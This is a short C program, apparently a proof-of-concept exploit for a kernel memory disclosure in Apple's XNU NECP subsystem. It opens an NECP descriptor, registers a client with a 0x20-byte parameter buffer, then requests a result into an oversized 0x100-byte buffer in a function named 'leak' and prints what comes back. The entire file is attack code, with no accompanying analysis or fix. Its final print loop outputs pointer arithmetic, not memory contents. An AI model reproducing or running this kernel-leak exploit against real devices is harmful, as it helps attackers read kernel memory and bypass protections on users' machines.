#include <errno.h>
#include <unistd.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <sys/kern_control.h>
#include <sys/sys_domain.h>
#include <net/if.h>
#include <netinet/in_var.h>
#include <netinet6/nd6.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <sys/syscall.h>
#include <sys/socket.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define SO_NECP_CLIENTUUID  0x1111

int open_necp(){
	// 0
	// 4 is observe mode
    int fd = syscall(SYS_necp_open, 0);
    if(fd < 0){
        perror("SYS_necp_open");
        exit(0);
    }
    return fd;
}

// add client
size_t *allocation(int fd){
    // 16 bytes memory for uuid
	int sock;
    size_t *clientid = malloc(0x10);
    char buffer[0x20] = "hello necp this is test";
    size_t buffer_size = 0x20;
    syscall(SYS_necp_client_action, fd, 1, clientid, 16, buffer, buffer_size);
    printf("get client id: %llx %llx\n", clientid[0], clientid[1]);

	sock = socket(PF_INET, SOCK_DGRAM, IPPROTO_UDP);
	if(setsockopt(sock, SOL_SOCKET, SO_NECP_CLIENTUUID, clientid, 0x10) < 0){
		perror("setsockopt");
	}

	return clientid;
}


void leak(int fd, size_t *clientid){
	// size should be larger than 0x20 which is used in the allocation.
	char buffer[0x100] = {};

	// NECP_CLIENT_ACTION_COPY_PARAMETERS is defined in XNU kernel
	syscall(SYS_necp_client_action, fd, /*NECP_CLIENT_ACTION_COPY_UPDATED_RESULT*/ 16,
				clientid, 16, buffer, sizeof(buffer));
	printf("we got buffer : %s\n", buffer);
	
	for (int i = 0; i < 0x100/8; i++) {
      printf("0x%llx\n", (size_t *)buffer+8*i);
    }


}

int main(){
	int fd = open_necp();
	size_t *clientid = allocation(fd);
	leak(fd, clientid);
}
